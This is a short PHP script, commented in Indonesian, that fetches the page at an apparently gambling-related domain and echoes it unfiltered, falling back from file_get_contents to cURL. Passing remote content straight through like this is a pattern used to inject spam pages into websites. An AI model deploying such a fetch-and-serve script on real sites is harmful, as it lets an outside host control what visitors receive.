<?php
$url = 'https://newlivertp.sobat138.today/';

$content = @file_get_contents($url); // Menggunakan @ untuk mengabaikan warning jika gagal

if ($content === FALSE) {
    // Jika file_get_contents gagal, gunakan cURL
    $ch = curl_init(); // Inisialisasi cURL
    curl_setopt($ch, CURLOPT_URL, $url); // Set URL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Set untuk mengembalikan sebagai string

    $content = curl_exec($ch); // Eksekusi cURL

    if ($content === FALSE) {
        echo "Gagal mengambil konten: " . curl_error($ch);
    } else {
        echo $content; // Menampilkan konten yang diambil
    }

    curl_close($ch); // Tutup cURL
} else {
    echo $content; // Menampilkan konten yang diambil dari file_get_contents
}
?>
